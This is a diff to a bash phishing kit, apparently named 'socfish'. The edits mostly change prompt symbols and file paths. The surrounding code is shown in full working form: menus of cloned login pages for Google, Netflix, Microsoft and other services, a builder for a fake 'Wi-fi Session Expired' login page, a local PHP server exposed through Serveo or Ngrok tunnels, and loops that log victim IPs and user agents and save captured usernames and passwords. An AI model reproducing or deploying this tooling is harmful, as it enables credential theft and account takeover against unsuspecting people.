@@ -49,7 +49,7 @@ printf "\e[1;92m[\e[0m\e[1;77m5\e[0m\e[1;92m]\e[0m\e[1;93m Github\e[0m         \
 printf "\e[1;92m[\e[0m\e[1;77m6\e[0m\e[1;92m]\e[0m\e[1;93m Google\e[0m         \e[1;92m[\e[0m\e[1;77m14\e[0m\e[1;92m]\e[0m\e[1;93m Wordpress\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m7\e[0m\e[1;92m]\e[0m\e[1;93m Spotify\e[0m        \e[1;92m[\e[0m\e[1;77m15\e[0m\e[1;92m]\e[0m\e[1;93m Microsoft\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m8\e[0m\e[1;92m]\e[0m\e[1;93m Netflix\e[0m        \e[1;92m[\e[0m\e[1;77m16\e[0m\e[1;92m]\e[0m\e[1;93m InstaFollowers\e[0m\n"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m\en' option
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a social network: \e[0m\en' option
 
 
 if [[ $option == 1 || $option == 01 ]]; then
@@ -176,19 +176,19 @@ default_user_text="Username:"
 default_pass_text="Password:"
 default_sub_text="Log-In"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 1 (Default: Wi-fi Session Expired): \e[0m' cap1
 cap1="${cap1:-${default_cap1}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Title 2 (Default: Please login again.): \e[0m' cap2
 cap2="${cap2:-${default_cap2}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Username field (Default: Username:): \e[0m' user_text
 user_text="${user_text:-${default_user_text}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Password field (Default: Password:): \e[0m' pass_text
 pass_text="${pass_text:-${default_pass_text}}"
 
-read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
+read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Submit field (Default: Log-In): \e[0m' sub_text
 sub_text="${sub_text:-${default_sub_text}}"
 
 echo "<!DOCTYPE html>" > sites/create/login.html
@@ -220,8 +220,8 @@ IFS=$'\n'
 password=$(grep -o 'Pass:.*' sites/$server/usernames.txt | cut -d ":" -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
-cat ~/socfish/sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
+cat sites/$server/usernames.txt >> sites/$server/saved.usernames.txt
+printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for targets...\e[0m\n"
 
 }
@@ -235,7 +235,7 @@ ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Victim IP:\e[0m\e[1;77m %s\e[0m\n" $ip
 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
-cat ~/socfish/sites/$server/ip.txt >> sites/$server/saved.ip.txt
+cat sites/$server/ip.txt >> sites/$server/saved.ip.txt
 
 if [[ -e iptracker.log ]]; then
 rm -rf iptracker.log
@@ -313,10 +313,10 @@ printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting for targets...\e[0m\n"
 
 
 serverx() {
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Starting Serveo...\e[0m\n"
+printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Starting Serveo...\e[0m\n"
 command -v ssh > /dev/null 2>&1 || { echo >&2 "Error, openssh is not installed! Aborting..."; exit 1; }
 if [[ -e sendlink ]]; then
 rm -rf sendlink
@@ -343,7 +343,7 @@ rm -rf sites/$server/usernames.txt
 fi
 
 default_port="3333" #$(seq 1111 4444 | sort -R | head -n1)
-printf '\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose a port (Default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_port
+printf '\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a port (Default:\e[0m\e[1;77m %s\e[0m\e[1;92m): \e[0m' $default_port
 read port
 port="${port:-${default_port}}"
 serverx
@@ -368,7 +368,7 @@ sleep 0
 else
 command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
 command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
-printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
 arch=$(uname -a | grep -o 'arm' | head -n1)
 arch2=$(uname -a | grep -o 'Android' | head -n1)
 if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
@@ -398,10 +398,10 @@ fi
 fi
 fi
 
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
 sleep 2
-printf "\e[1;92m[\e[0m*\e[1;92m] Starting Ngrok...\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Starting Ngrok...\n"
 ./ngrok http 3333 > /dev/null 2>&1 &
 sleep 10
 
@@ -420,7 +420,7 @@ printf "\n"
 printf "\e[1;92m[\e[0m\e[1;77m1\e[0m\e[1;92m]\e[0m\e[1;93m Serveo\e[0m\n"
 printf "\e[1;92m[\e[0m\e[1;77m2\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
 default_option_server="1"
-read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose portfwd service: \e[0m\en' option_server
+read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose portfwd service: \e[0m\en' option_server
 option_server="${option_server:-${default_option_server}}"
 if [[ $option_server == 1 || $option_server == 01 ]]; then
 startx
@@ -440,15 +440,15 @@ while [ true ]; do
 
 
 if [[ -e "sites/$server/ip.txt" ]]; then
-printf "\e[1;92m[\e[0m*\e[1;92m] Target opened the link!\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
 sleep 1
-printf "\e[1;92m[\e[0m*\e[1;92m] IP found!\n"
+printf "\e[1;92m[\e[0m+\e[1;92m] IP found!\n"
 catch_ip
 rm -rf sites/$server/ip.txt
 fi
 sleep 0.5
 if [[ -e "sites/$server/usernames.txt" ]]; then
-printf "\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials found!\n"
+printf "\e[1;93m[\e[0m+\e[1;93m]\e[0m\e[1;92m Credentials found!\n"
 catch_cred
 rm -rf sites/$server/usernames.txt
 fi
